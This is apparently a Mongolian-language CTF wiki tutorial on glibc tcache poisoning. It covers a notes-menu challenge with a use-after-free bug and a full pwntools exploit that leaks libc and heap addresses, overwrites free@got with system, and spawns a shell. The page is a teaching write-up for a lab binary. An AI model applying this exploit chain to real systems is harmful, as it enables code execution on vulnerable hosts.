---
title: Heap (tcache poisoning)
description: glibc heap-ийн суурь — chunk, tcache, use-after-free. UAF-аар libc болон heap хаягийг leak хийж, tcache poisoning-оор GOT дарж system дуудна.
---

**Heap** нь `malloc`/`free`-ийн динамик санах ой. glibc-ийн **use-after-free (UAF)** алдааг ашиглан
**tcache poisoning** хийж, дурын хаягт бичих чадвар олж аваад эцэст нь shell авна.

:::note[Юуны өмнө]
- **[Heap](../../basics/heap/)** — chunk, bins, tcache, safe-linking.
- Энэ хуудас glibc **2.35+** (tcache + safe-linking) дээр ажиллана.
:::

## tcache poisoning гэж юу вэ

tcache нь `fd` заагчаар холбогдсон энгийн **singly-linked list**. Хэрэв free хийсэн chunk-ийн
`fd`-г (UAF, buffer overflow эсвэл double-free-ээр) дарж чадвал, дараагийн `malloc` уг `fd`-г дагаж **чиний
сонгосон дурын хаяг** дээр chunk "байгаа" мэт буцаана. Тэр chunk руу бичих нь = **дурын хаягт бичих** primitive.

![tcache 0x60 жагсаалтын өөрчлөлт: ① free(C) → толгой C; ② free(D) → D→C→∅ ба notes[3] нь free хийсэн D-г хэвээр заана (dangling, UAF); ③ dangling notes[3]-ээр D.fd-г &notes болгож дарна (poison); ④ malloc нь D-г буцаана; ⑤ дараагийн malloc нь &notes-ийг буцаана — дурын хаягт chunk авлаа.](../../../../assets/pwn/tcache-uaf.svg)

Ерөнхий алхам:

1. Ижил хэмжээний хоёр chunk (`C`, `D`) `free` хийнэ → tcache жагсаалт `D → C`.
2. Чөлөөлсөн `D`-ийн `fd`-г зорилтот хаяг руу дарна (safe-linking тул `(D>>12) XOR зорилтот` хэлбэрээр).
3. Хоёр `malloc` хийнэ: эхнийх нь `D`, хоёр дахь нь **зорилтот хаяг** дээрх chunk.
4. Тэнд бичиж, жишээ нь GOT entry-г `system` болгоно.

Хоёр зүйл хэрэгтэй: (а) `fd`-г дарах **бичих алдаа** (энд UAF), (б) safe-linking-ийг тойрох **heap leak**
(`page >> 12`). Хоёуланг нь доорх challenge дээр олж авна.

## Бодлого

Notes цэсний программ — `add` / `edit` / `show` / `delete`. Алдаа нь `delete`-д:

| Файл | Тайлбар |
|------|---------|
| [`main.c`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/userland/tcache-poison/main.c) | Эх код (UAF) |
| [`heap`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/userland/tcache-poison/heap) | Бэлэн binary |
| [`libc.so.6`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/userland/tcache-poison/libc.so.6), [`ld-...`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/userland/tcache-poison/ld-linux-x86-64.so.2) | Зориулалтын libc (offset таарна; [pwninit](../../tools/pwninit/) автоматжуулна) |

```console
$ checksec --file=./heap
   RELRO: Partial RELRO      # GOT бичигдэнэ
   Canary: No canary
   NX: enabled
   PIE: No PIE               # GOT-ийн хаяг тогтмол
```

**Docker-ээр (сервер).** Бэлэн image GitHub (ghcr)-д байгаа. Татаж ажиллуулна:

```console
$ docker run --rm -p 1337:1337 ghcr.io/computer-communication-security-club/pwn-tcache-poison:latest
```

## Бодолт

### 0. Бэлдэц

`pwn template`-ээр бэлдэц үүсгээд ([pwntools](../../tools/pwntools/#pwn-template)) цэстэй харилцах
туслахуудыг нэмнэ:

```python title="exploit.py"
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './heap')
libc = ELF(args.LIBC or './libc.so.6', checksec=False)

host = args.HOST or 'localhost'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

def add(i, s, d=b'A'):
    io.sendlineafter(b'> ', b'1'); io.sendlineafter(b'idx: ', str(i).encode())
    io.sendlineafter(b'size: ', str(s).encode()); io.sendafter(b'data: ', d)
def edit(i, d): io.sendlineafter(b'> ', b'2'); io.sendlineafter(b'idx: ', str(i).encode()); io.sendafter(b'data: ', d)
def show(i):    io.sendlineafter(b'> ', b'3'); io.sendlineafter(b'idx: ', str(i).encode()); return u64(io.recv(8).ljust(8, b'\x00'))
def dele(i):    io.sendlineafter(b'> ', b'4'); io.sendlineafter(b'idx: ', str(i).encode())
```

Ажиллуулах горимууд: `./exploit.py LOCAL GDB` (pwndbg хавсаргана), `./exploit.py LOCAL` (локал),
`./exploit.py HOST=… PORT=…` (remote).

### 1. Ямар primitive байна вэ (UAF)

Алдаа нь `delete`-д — `free` хийгээд заагчийг нь **цэвэрлэдэггүй**:

```c
static void del(void) {
    printf("idx: "); int i = readint(); if (i < 0 || i >= MAX) return;
    free(notes[i]);        // BUG: notes[i]-г NULL болгодоггүй -> use-after-free
}
```

Тиймээс `free` хийсэн chunk руу заагч үлдэж, `edit(i)` → free хийсэн chunk-д **бичнэ** (tcache `fd` дарах),
`show(i)` → free хийсэн chunk-ийг **уншина** (leak). Бүх дараагийн алхам энэ хоёр дээр тулгуурлана. No PIE тул
`notes`, `free@got` тогтмол: `exe.sym['notes']`, `exe.got['free']`.

### 2. libc хаягийг leak хийх

**Код руугаа нэм:**

```python
add(0, 0x500); add(1, 0x20)     # A (том -> unsorted) + guard (top-той нийлэхээс сэргийлнэ)
dele(0)                         # A -> unsorted bin
leak = show(0)                  # A.fd-г уншина
log.info('leak = %#x', leak)
```

**Ажиллуул, pwndbg-д шалга.** `dele(0)`-ийн дараа зогсоож:

```ansi
[1;31mpwndbg>[0m bins
unsortedbin
all: [34m0x555…5030[0m —▸ [34m0x7049bb012ac8[0m [32m(main_arena+8)[0m ◂— …
```

`leak` нь `main_arena+8` руу зааж байна — **libc доторх** хаяг. libc base хүртэлх зай тогтмол; `vmmap`-аар батал:

```ansi
[1;31mpwndbg>[0m vmmap libc
[34m0x7049bae00000[0m … libc.so.6          [90m# base[0m
[1;31mpwndbg>[0m p/x [34m0x7049bb012ac8[0m - [34m0x7049bae00000[0m
$1 = [34m0x212ac8[0m                        [90m# <- энэ зайг код руугаа тавина[0m
```

**Олсон хамаарлаа код руугаа буцааж тавь:**

```python
libc.address = leak - 0x212ac8
log.info('libc = %#x  system = %#x', libc.address, libc.sym['system'])
add(0, 0x500)                   # A-г unsorted-оос буцааж авна (цэвэрлэгээ)
```

:::tip
Өөр libc дээр зай өөр. `p/x <main_arena+8 хаяг> - <libc base>` бодно, эсвэл symbol байвал
`leak - libc.sym['main_arena'] - 0x10`.
:::

### 3. heap хаягийг leak хийх (safe-linking key)

Safe-linking: `fd = (page>>12) XOR дараагийн`. Хуурахын тулд `page>>12` хэрэгтэй. tcache-д **ганц** chunk
байхад `fd = page>>12` — шууд уншиж авна.

**Нэм:**

```python
add(2, 0x50); add(3, 0x50)      # C, D (0x60 chunk)
dele(2)                         # C -> tcache (ганцаараа)
key = show(2)                   # fd = C>>12
log.info('key = %#x', key)
```

**Шалга.** `tcachebins`-д C-ийн бодит хаягийг хараад `>>12` нь `key`-тэй тохирч байгааг батал:

```ansi
[1;31mpwndbg>[0m tcachebins
[34m0x60[0m [ 1]: [34m0x555…5890[0m ◂— 0          [90m# key == (0x555…5890 >> 12)[0m
```

C ба D нэг page дээр тул энэ `key` нь D-д ч хүчинтэй.

### 4. tcache-ийг poison хийх

Одоо [tcache poisoning](#tcache-poisoning-гэж-юу-вэ)-г бодит байдал дээр хийнэ: зорилтот хаяг маань `&notes`.
Dangling `notes[3]`-ээр D-ийн `fd`-г дарж **`&notes` руу** чиглүүлнэ. **Нэм:**

```python
dele(3)                         # D -> tcache (толгой = D, D.fd = C)
edit(3, p64(key ^ exe.sym['notes']))   # D.fd -> mangle(&notes)
```

**Шалга — poison ажилласан уу?** `tcachebins` chain `(notes)` руу чиглэвэл болсон. pwndbg нь fd-г задлаад
chain хаашаа чиглэснийг харуулна:

```ansi
[1;31mpwndbg>[0m tcachebins          [90m# ӨМНӨ:  0x60 [ 2]: 0x555…58f0 —▸ 0x555…5890 ◂— 0   (D —▸ C)[0m
[1;31mpwndbg>[0m tcachebins          [90m# edit-ийн ДАРАА:[0m
[34m0x60[0m [ 2]: [34m0x555…58f0[0m —▸ [34m0x404080[0m [32m(notes)[0m —▸ …      [90m# D —▸ &notes ![0m
```

`(notes)` руу заагаагүй бол `key` эсвэл `&notes` буруу. Raw fd-г `show(3)`-оор уншаад `key`-ээр задал:
`key ^ show(3) == &notes` байх ёстой (gdb: `p/x key ^ notes`).

**Одоо хоёр удаа `malloc` хийнэ.** Эхний `malloc` нь D-г, хоёр дахь нь хуурсан `&notes`-ийг буцаана. Хоёр дахь
chunk руу бичсэн 8 байт нь шууд `notes[0]`-д тусна — тэнд `free@got`-ийг тавина:

```python
add(4, 0x50)                    # -> D
add(5, 0x50, p64(exe.got['free']))   # -> &notes;  notes[0] = free@got
```

`break malloc; finish`-ээр `$rax`-ийг харвал эхний `malloc` D-г, хоёр дахь нь **`0x404080` (&notes)**-ийг
буцааж буй нь poison амжилттай болсныг батална:

```ansi
[1;31mpwndbg>[0m break malloc
[1;31mpwndbg>[0m c   [90m# add(4)[0m
[1;31mpwndbg>[0m finish
…  $rax = [34m0x555…58f0[0m        [90m# D[0m
[1;31mpwndbg>[0m c   [90m# add(5)[0m
[1;31mpwndbg>[0m finish
…  $rax = [34m0x404080[0m          [90m# &notes  <- дурын хаягт chunk авлаа![0m
```

### 5. GOT дарж shell авах

`notes[0]` одоо `free@got` руу заана → `edit(0)` тэр хаягт **шууд бичнэ**. `edit(0)`-ийн өмнө/дараа `free@got`-г
`x/gx 0x404000`-оор (эсвэл UAF `show(0)`-оор) харьцуул:

```ansi
[1;31mpwndbg>[0m x/gx 0x404000       [90m# edit(0)-ийн ДАРАА[0m
0x404000: [34m0x7049bae5c2e0[0m      [90m# = system  (өмнө нь lazy-bind resolver байсан)[0m
```

**Нэм, trigger:**

```python
add(6, 0x20, b'/bin/sh\x00')    # trigger chunk
edit(0, p64(libc.sym['system']))   # free@got = system
dele(6)                         # free("/bin/sh") -> system("/bin/sh")
io.interactive()
```

:::note[Яагаад шууд `free@got` дээр биш, `notes` дээр гаргадаг вэ]
`tcache_get` нь авсан chunk-ийн `key`-г (chunk+8) NULL болгодог. Шууд `free@got` (0x404000) дээр гаргавал
хажуугийн `0x404008` (`puts@got`) NULL болж цэс унана; `atoi@got` (0x404038) нь 16-д тэгшлэгдээгүй тул
tcache шалгалтанд унана. Тиймээс 16-align `notes` (0x404080) дээр гаргаж, энгийн `edit`-ээр GOT рүү бичдэг.
:::

<details>
<summary>Бүрэн exploit</summary>

```python title="exploit.py"
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './heap')
libc = ELF(args.LIBC or './libc.so.6', checksec=False)

host = args.HOST or 'localhost'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    return start_local(argv, *a, **kw) if args.LOCAL else start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

def add(i, s, d=b'A'):
    io.sendlineafter(b'> ', b'1'); io.sendlineafter(b'idx: ', str(i).encode())
    io.sendlineafter(b'size: ', str(s).encode()); io.sendafter(b'data: ', d)
def edit(i, d): io.sendlineafter(b'> ', b'2'); io.sendlineafter(b'idx: ', str(i).encode()); io.sendafter(b'data: ', d)
def show(i):    io.sendlineafter(b'> ', b'3'); io.sendlineafter(b'idx: ', str(i).encode()); return u64(io.recv(8).ljust(8, b'\x00'))
def dele(i):    io.sendlineafter(b'> ', b'4'); io.sendlineafter(b'idx: ', str(i).encode())

notes, free_got = exe.sym['notes'], exe.got['free']

add(6, 0x20, b'/bin/sh\x00')                 # trigger chunk
add(0, 0x500); add(1, 0x20); dele(0)         # libc leak
libc.address = show(0) - 0x212ac8; add(0, 0x500)
add(2, 0x50); add(3, 0x50); dele(2)          # heap key
key = show(2)
dele(3); edit(3, p64(key ^ notes))           # tcache poison -> &notes
add(4, 0x50); add(5, 0x50, p64(free_got))    # notes[0] = free@got
edit(0, p64(libc.sym['system']))             # free@got = system
dele(6)                                      # system("/bin/sh")
io.interactive()
```

</details>

```console
$ ./exploit.py LOCAL
[*] libc = 0x7049bae00000  system = 0x7049bae5c2e0
uid=1000(ctf) ...
flag{h34p_tc4che_p01s0n_g0t_0verwr1te}
```

## Хамгаалалт

- **tcache double-free хамгаалалт** (`key`) — нэг chunk-ийг дараалан 2 удаа free хийвэл илрүүлнэ.
- **Safe-linking** — `fd`-г xor-оор нууна (heap leak шаардана).
- **Full RELRO** бол GOT бичигдэхгүй — тэр үед `__free_hook` (хуучин glibc), FSOP (`_IO_FILE`), эсвэл
  `__exit_funcs` зэрэг өөр target руу чиглэдэг.
- Орчин үеийн glibc-д `__malloc_hook`/`__free_hook`-ийг (2.34-т) устгасан тул GOT/FSOP түгээмэл болсон.

## Эх сурвалж

- [how2heap (shellphish)](https://github.com/shellphish/how2heap) — heap техникүүдийн цуглуулга
- [glibc malloc internals (sploitfun)](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)
- [Safe-linking (Check Point)](https://research.checkpoint.com/2020/safe-linking-eliminating-a-seemingly-harmless-bug/)
